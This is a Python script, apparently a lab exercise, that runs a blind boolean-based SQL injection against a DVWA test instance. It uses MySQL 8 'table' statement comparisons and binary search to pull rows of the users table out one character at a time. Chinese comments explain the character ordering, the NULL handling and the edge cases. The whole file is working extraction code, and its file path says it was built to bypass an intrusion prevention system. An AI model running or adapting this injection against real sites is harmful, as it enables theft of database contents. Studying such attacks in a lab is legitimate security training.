'''
Author: yhh
Date: 2022-11-04 13:43:46
LastEditTime: 2022-11-04 18:01:26
LastEditors: yhh
Description: 
FilePath: \undefinedd:\Document\PythonFile\SQL注入\SQL8绕过IPS爆数据\sql8_injection_data.py
yhh
'''
 import requests

url = "http://192.168.1.221/dvwa_test/vulnerabilities/sqli/?"
header = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "connection": "close",
    "cookie": "experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkltRmpOMlZpWVdFNExUTTVNRFl0TkRnd05DMDRNRFl6TFRnMFlXSTRaRGhoTURFMVlpST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--fa61bc8250f428fab74992fe3b6e868f5908d932; sidebar_collapsed=false; PHPSESSID=er8hio283j113obiietcrkugt7; security=low",
    "host": "192.168.1.221",
    "referer": "http://192.168.1.221/dvwa_test/vulnerabilities/sqli/",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
}
# asc=[' ','_', '-', ',', ';', ':', '!', '?', '.', "'", '"', '(', ')', '[', ']', '{', '}', '@', '*', '/', '&', '#', '%', '`', '\\', '^', '+', '<', '=', '>', '|', '~', '$', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'g', 'h', 'i', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
asc=['','_', '-', ',', ';', ':', '!', '?', '.', "'", '"', '(', ')', '[', ']', '{', '}', '@', '*', '/', '&', '#', '%', '`', '\\', '^', '+', '<', '=', '>', '|', '~', '$', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'g', 'h', 'i', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',' ']
#>=的二分法没法搜索比较最两边的字符  因为>=的情况下m=mid 考虑最极端的情况字符是最后边的'z' 就永远是>=  知道最后会被认为是y  但是因为可显示字符最大是z  >='z'的情况就只能是z
#<的情况下 n=mid是后直接检测mid==1了也无法搜索到最左边的字符的 所以需要最左边也加上一个字符
#所以应该将最右边填充一个字符  可以是任何字符
#因为实际并不会将此字符用来比较  这里用' '代替即可
# print(asc[69])
#asc长度为70   上面是跑出的比较集
#主要是大小写 97:a 65:A  大写字母默认比较时会当做小写字母  
#夹在中间大小写字母的 91:[  92:\  93:] 94:^ 95: _   96:`  和   32-47之间的符号! " # $ % & ' ( ) * + , - . /  和  123往后的 123:{ 124:| 125:} 126:~ 127:DEL  这些可显示的特殊字符都比数字和字母小  这些特殊字符内部和数字字母内部比较还是遵循ASCII码大小
for i in range(0,5):  #表的记录索引从0开始，这里从0到4共5个
    a=''
    print("当前爆破索引数:",i)
    # m=48  #ASCII可显示字符的最小序号
    # n=126 #ASCII可显示字符的最大序号  因为比较集不用ASCII所以这里不能用ASCII的顺序
    m=0
    n=69
    while 1:
        b = 1
        mid=(m+n)//2  #二分法去找
        print("m,n,mid:",m,n,mid)
        # print(a+chr(mid))
        # print(asc[mid])
        # params1={"id":"2' and (table information_schema.schemata limit {},1)>=('def','{}','0',4,5,6)-- ".format(i,a+chr(mid)),"Submit":"Submit"}
        params1={"id":"2' and (table dvwa.users limit {},1)>=({},0,0,0,'{}','',7,8)-- ".format(i,i+1,a+asc[mid]),"Submit":"Submit"}
        #不能是--+  --+会将+当做+号进行url编码  而不是当做空格的url表编码   由于记录中有NULL需要特别处理  NULL和什么比都是NULL,所以不能让NULL参与比较  让NULL出现的参数的前一个非NULL参数去比较
        r=requests.get(url=url,params=params1,headers=header)
        print("2' and (table dvwa.users limit {},1)>=({},0,0,0,'{}','',7,8)-- ".format(i,i+1,a+asc[mid]))
        if "Gordon"  not in r.text: # 说明 < mid
            # print("<",a+chr(mid))
            print("<",a+asc[mid])
            flag=1
            n=mid
            if asc[mid]=='a':
            #由于出现_会导致很特殊的情况需要特别处理
                print('检测_的特殊情况')
                params2={"id":"2' and (table dvwa.users limit {},1)>({},0,0,0,'{}','z',7,8)-- ".format(i,i+1,a+'9z'),"Submit":"Submit"}
                r2=requests.get(url=url,params=params2,headers=header)
                print("2' and (table dvwa.users limit {},1)>({},0,0,0,'{}','z',7,8)-- ".format(i,i+1,a+'9z'))
                #不能是a+'9'
                #因为9x 这种9后面还有数据的情况也符合 > a+'9'的情况  所以拼接9z防止存在疑惑的这个位后面的数据影响结果
                #以防真是9时去比较下一个参数，又因为下一个参数是'' 任何字符包括空格都比它大从而错误的返回1  导致认为是_的特殊情况  所以让下一个参数是z 但凡下一个参数参加比较 一个返回0
                if  "Gordon"  in r2.text:
                    # print(r2.text)5f4dcc3b5aa765d61d8327deb882cf99
                    print(">9z并且<a的特殊情况:_")
                    a+='_'
                    m=0
                    n=69
                    print("当前爆破出的数据为:",a)
                    continue
        else:  # 说明 >=mid成立
            # print(">=",a+chr(mid))
            print(">=",a+asc[mid])
            flag=0
            m=mid
        if(mid==1 and flag==1):  #数据库名不可以带空格,数据集里的空格用来占位的本来就[空格]<_  最后一次的m,n,mid如果是0 2 1  且还是<1  说明没有字符了  这个行的数据库名爆破结束
            print(f'第{i}索引爆破出的数据为{a}')
            break
        if(m+1==n or m==n):
            # a+=chr(m)
            a+=asc[m]
            # m=32  #ASCII可显示字符的最小序号  重置m  开始爆破下一个字母
            # n=126 #ASCII可显示字符的最大序号  重置n  开始爆破下一个字母
            m=0
            n=69
            print("当前爆破出的数据为:",a)